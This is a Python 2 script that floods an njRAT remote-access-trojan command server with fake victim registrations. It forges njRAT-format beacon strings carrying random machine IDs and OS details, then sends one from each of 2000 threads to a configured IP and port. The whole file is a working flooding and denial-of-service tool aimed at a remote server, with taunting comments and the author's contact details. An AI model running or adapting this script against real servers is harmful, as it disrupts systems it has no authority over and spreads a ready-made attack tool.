#!/usr/bin/env python

# Desenvolvido por Adriel Freud!
# Contato: businessc0rp2k17@gmail.com
# FB: http://www.facebook.com/xrn401
#   =>DebutySecTeamSecurity<=

import socket
import base64
import thread
import time
import random

ip = "127.0.0.1" # from server|malware
port = 5552 # port for connect on the server | reverse

thread_count = 2000
my_delay = 20

delimiter = "|'|'|"
msg_type = "ll"
victim_string_prefix = "HacKed"
vol_identifier = "F8CB008F"
pc_name = "FuckU_SKIDD-PC"
username = "5k1d_d357r0y3r"
lm_time = "17-07-30"
os_info = "Win 7 Enterprise N SP1 x64"
cam = "No"
ver = "0.7d"

foreground_window = "NJRAT is for losers" # MSG
registry_key_values = "b88ece4c04f706c9717bbe6fbda49ed2,2681e81bb4c4b3e6338ce2a456fb93a7,8e78a69ca187088abbea70727d268e90,"


def gen_vol_id():
    return ''.join([random.choice('0123456789ABCDEF') for x in range(8)])

def gen_ver_str():
    return "0.{}.{}".format(random.choice('123456789'), random.choice('abcde'))

def gen_cam_bool():
    return random.choice(["No", "Yes"])

def gen_install_time():
    return "{:02d}-{:02d}-{:02d}".format(random.randint(0,19),random.randint(1,12),random.randint(1,31))

def gen_os_ver():
    return "Win {} {} SP{} {}".format(random.choice(["XP", "7", "8", "8.1", "10"]), random.choice(["Home Premium", "Pro", "Professional", "Ultimate", "Enterprise"]), random.randint(0, 3), random.choice(["x86", "x64"]))


def callin_string():
    my_string = ""
    my_string += msg_type + delimiter
    my_string += base64.b64encode(victim_string_prefix + '_' + gen_vol_id()) + delimiter
    my_string += pc_name + delimiter
    my_string += username + delimiter
    my_string += gen_install_time() + delimiter + delimiter
    my_string += gen_os_ver() + delimiter
    my_string += gen_cam_bool() + delimiter
    my_string += gen_ver_str() + delimiter
    my_string += ".." + delimiter
    my_string += base64.b64encode(foreground_window) + delimiter
    my_string += registry_key_values


    return str(len(my_string)) + '\x00' + my_string


def spam_server(threadName, delay):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(callin_string())
    data = s.recv(1024)
    time.sleep(delay)

try:
    for x in range(thread_count):
        thread.start_new_thread( spam_server, ("Thread-{}".format(x), my_delay, ) )
    time.sleep(65)
except:
	pass